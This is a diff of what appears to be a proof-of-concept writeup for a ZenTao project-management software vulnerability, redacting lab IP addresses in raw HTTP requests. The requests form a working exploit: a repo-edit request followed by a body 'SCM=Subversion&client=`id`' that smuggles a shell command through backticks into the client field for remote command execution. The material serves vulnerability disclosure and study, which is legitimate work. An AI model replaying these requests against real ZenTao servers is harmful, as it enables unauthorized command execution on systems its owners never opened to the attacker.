@@ -386,14 +386,14 @@ Cache-Control: no-cache
 Upgrade-Insecure-Requests: 1
 User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36
 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
-Referer: http://10.211.55.12/zentao/user-login-L3plbnRhby8=.html
+Referer: http://x.x.x.x/zentao/user-login-L3plbnRhby8=.html
 Accept-Encoding: gzip, deflate
 Accept-Language: zh-CN,zh;q=0.9
 Cookie: zentaosid=d53959592d07ca9e6e0bf25ef479a0c2; lang=zh-cn; device=desktop; theme=default
 Connection: close
 Content-Type: application/x-www-form-urlencoded
 X-Requested-With: XMLHttpRequest
-Referer: http://10.211.55.12/repo-edit-1-0.html
+Referer: http://x.x.x.x/repo-edit-1-0.html
 Content-Length: 111
 
 product%5B%5D=1&SCM=Gitlab&name=66666&path=&encoding=utf-8&client=&account=&password=&encrypt=base64&desc=&uid=
@@ -415,7 +415,7 @@ Cookie: zentaosid=d53959592d07ca9e6e0bf25ef479a0c2; lang=zh-cn; device=desktop; 
 Connection: close
 Content-Type: application/x-www-form-urlencoded
 X-Requested-With: XMLHttpRequest
-Referer: http://10.211.55.12/repo-edit-1-0.html
+Referer: http://x.x.x.x/repo-edit-1-0.html
 Content-Length: 30
 
 SCM=Subversion&client=`id`
